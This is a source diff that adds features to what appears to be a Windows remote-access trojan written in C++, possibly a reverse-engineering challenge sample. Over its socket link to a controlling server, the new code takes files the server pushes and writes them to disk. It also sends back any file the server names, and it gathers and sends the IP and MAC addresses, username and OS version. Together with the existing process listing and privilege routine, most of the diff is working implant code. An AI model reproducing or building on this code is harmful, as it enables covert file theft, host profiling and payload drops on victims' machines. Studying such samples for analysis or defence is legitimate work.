@@ -6,12 +6,15 @@
 #include <stdlib.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
+#include <iphlpapi.h>
+#include <lmcons.h>
 #include <vector>
 #include <stack>
 #include <queue>
 #include <iostream>
 #include <fstream>
 #include <string>
+#include <sstream>
 
 #define DEFAULT_BUFLEN 1024
 #define DEFAULT_PORT "4444"
@@ -19,16 +22,20 @@
 
 typedef std::vector<int> vi;
 
-char *commands[5] = {"GiveMeProcesses", "DownloadMyFile", "UploadThisFile", "GiveMeInfo", "Yeet"};
+char *commands[6] = {"GiveMeProcesses", "DownloadMyFile", "UploadThisFile", "GiveMeInfo", "Yeet", "exit"};
 char recvbuf[DEFAULT_BUFLEN];
 SOCKET ourSock;
+std::string dataToSend;
+
 bool visited[DEFAULT_BUFLEN];
 int maxDepth = 0;
+std::vector<vi> G;
+int idx = 0;
+
 char *NotKey = "MuchReversingButThisIsNotTheKeyHeheMuchReversingButThisIsNotTheKeyHehe";
 char *KeyFile = "graph.txt";
-std::string dataToSend;
-int idx = 0;
-std::vector<vi> G;
+
+// === Graph Theory Magic ===
 
 void WeInitGraph() {
 	std::ifstream inp(KeyFile);
@@ -66,6 +73,10 @@ void WeDFS(int u, char *data, int stop) {
 	}
 }
 
+// === End Graph Theory Magic ===
+
+// === Secret Crypto Magic ===
+
 void WeEncryptOrWeDecrypt(char *data, int length) {
 	int nBytesProcessed = 0;
 	char *ptr = data;
@@ -74,18 +85,20 @@ void WeEncryptOrWeDecrypt(char *data, int length) {
 		idx = -1;
 		WeDFS(0, ptr, length - nBytesProcessed);
 		if (idx == -1) {
-			puts("\nDone DEncrypting");
 		} else {
 			ptr += idx + 1;
 			nBytesProcessed += idx + 1;
 		}
 	}
-	puts("\nDone DEncrypting");
 }
+
+// === End Secret Crypto Magic ===
+
+// === Socket Magic ===
 
 int WeSendData(std::string data, SOCKET sock) {
 	int allocLen = max(DEFAULT_BUFLEN, data.length() + 1);
-	printf("Data length: %d\n", data.length());
+	 printf("Data length: %d\n", data.length());
 	char *cdata = (char *)malloc(allocLen);
 	memcpy(cdata, data.c_str(), data.length());
 	cdata[data.length()] = 0;
@@ -138,7 +151,7 @@ int WeRecvData(char *&cdata, SOCKET sock) {
 		}
 	}
 
-	printf("Yeet length: %d\n", yeet.length());
+	// printf("Yeet length: %d\n", yeet.length());
 	cdata = (char *)malloc(yeet.length() + 1);
 	memcpy(cdata, yeet.c_str(), yeet.length());
 	WeEncryptOrWeDecrypt(cdata, yeet.length());
@@ -199,6 +212,10 @@ int WeShutdownSocket(SOCKET sock) {
 	WSACleanup();
 	return 0;
 }
+
+// === End Socket Magic ===
+
+// === Get Processes ===
 
 void WeGetOneProcess(DWORD processID) {
 	char szProcessName[MAX_PATH] = "<unknown>";
@@ -267,6 +284,139 @@ int WeGetProcesses(void) {
 	return 0;
 }
 
+// === End Get Processes ===
+
+// === Download Upload Files ===
+
+int WeDownloadFileFromURL() {
+	return 0;
+}
+
+int WeDownloadFileFromServer() {
+	char *filename;
+	WeRecvData(filename, ourSock);
+	puts(filename);
+
+	char *filesize;
+	WeRecvData(filesize, ourSock);
+	unsigned long fsize = atoi(filesize);
+	printf("File size: %lu\n", fsize);
+
+	char *data;
+	WeRecvData(data, ourSock);
+
+	FILE *fp = fopen(filename, "wb");
+	if (fp == NULL) {
+		printf("fopen error\n");
+	}
+	fwrite((void *)data, 1, fsize, fp);
+	fclose(fp);
+
+	free(filename);
+	free(filesize);
+	free(data);
+	return 0;
+}
+
+int WeUploadFile() {
+	char *filename;
+	WeRecvData(filename, ourSock);
+
+	FILE *fp = fopen(filename, "rb");
+	fseek(fp, 0, SEEK_END);
+	unsigned long filesize = ftell(fp);
+	fseek(fp, 0, SEEK_SET);
+	char *data = (char *)malloc(filesize);
+	fread(data, 1, filesize, fp);
+	fclose(fp);
+
+	std::stringstream ss;
+	ss << filesize;
+	WeSendData(ss.str(), ourSock);
+
+	WeSendData(std::string(data, filesize), ourSock);
+	return 0;
+}
+
+// === End Download Upload Files ===
+
+// === Get Host Information ===
+
+int WeGetIPAndMACAddresses() {
+	ULONG buflen = 3000;
+	IP_ADAPTER_INFO *pAdapterInfo = (IP_ADAPTER_INFO *)malloc(buflen);
+	IP_ADAPTER_INFO *ptr = NULL;
+	GetAdaptersInfo(pAdapterInfo, &buflen);
+	ptr = pAdapterInfo;
+	while (ptr) {
+		char *data = (char *)malloc(DEFAULT_BUFLEN);
+		memset(data, 0, DEFAULT_BUFLEN);
+		sprintf(data, "IP: %s - MAC: ", ptr->IpAddressList.IpAddress.String);
+		dataToSend += std::string(data);
+		for (unsigned int i = 0; i < ptr->AddressLength; i++) {
+			if (i == (ptr->AddressLength - 1))
+				sprintf(data, "%.2X\n", (int)ptr->Address[i]);
+			else
+				sprintf(data, "%.2X-", (int)ptr->Address[i]);
+			dataToSend += std::string(data);
+		}
+		free(data);
+		ptr = ptr->Next;
+	}
+	free(pAdapterInfo);
+	return 0;
+}
+
+int WeGetUsername() {
+	DWORD unameLen = UNLEN + 1;
+	char *uname = (char *)malloc(unameLen);
+	GetUserNameA(uname, &unameLen);
+	char *data = (char *)malloc(DEFAULT_BUFLEN);
+	memset(data, 0, DEFAULT_BUFLEN);
+	sprintf(data, "Username: %s\n", uname);
+	dataToSend += std::string(data);
+	return 0;
+}
+
+int WeGetOS() {
+	OSVERSIONINFOEXA OSInfo;
+	memset(&OSInfo, 0, sizeof(OSVERSIONINFOEXA));
+	OSInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
+	GetVersionExA((OSVERSIONINFOA *) &OSInfo);
+	
+	bool MajorVer10 = OSInfo.dwMajorVersion == 10;
+	bool MajorVer6 = OSInfo.dwMajorVersion == 6;
+	bool MajorVer5 = OSInfo.dwMajorVersion == 5;
+	
+	bool MinorVer0 = OSInfo.dwMinorVersion == 0;
+	bool MinorVer1 = OSInfo.dwMinorVersion == 1;
+	bool MinorVer2 = OSInfo.dwMinorVersion == 2;
+	bool MinorVer3 = OSInfo.dwMinorVersion == 3;
+	
+	bool isNT = OSInfo.wProductType == VER_NT_WORKSTATION;
+
+	if (MajorVer6 && MinorVer1 && isNT) {
+		dataToSend += "Windows 7";
+	}
+	else {
+		dataToSend += "unsupported";
+	}
+
+	dataToSend += '\n';
+	return 0;
+}
+
+int WeGetHostInformation() {
+	dataToSend = "";
+	WeGetIPAndMACAddresses();
+	WeGetUsername();
+	WeGetOS();
+	WeSendData(dataToSend, ourSock);
+	return 0;
+}
+
+// === End Get Host Information ===
+
 int main(int argc, char **argv) {
 
 	WeInitGraph();
@@ -274,14 +424,23 @@ int main(int argc, char **argv) {
 	WeGetPriv();
 
 	while (true) {
+		printf("Yeeting...\n");
 		char *cmd;
 		WeRecvData(cmd, ourSock);
 		puts(cmd);
 		if (!strncmp(cmd, commands[0], strlen(commands[0]))) {
 			WeGetProcesses();
+		} else if (!strncmp(cmd, commands[1], strlen(commands[1]))) {
+			WeDownloadFileFromServer();
+		} else if (!strncmp(cmd, commands[2], strlen(commands[2]))) {
+			WeUploadFile();
+		} else if (!strncmp(cmd, commands[3], strlen(commands[3]))) {
+			WeGetHostInformation();
+		} else if (!strncmp(cmd, commands[5], strlen(commands[5]))) {
+			exit(0);
 		} else {
-			printf("yeet!\n");
 			WeSendData(std::string("yeeted"), ourSock);
 		}
+		free(cmd);
 	}
 }
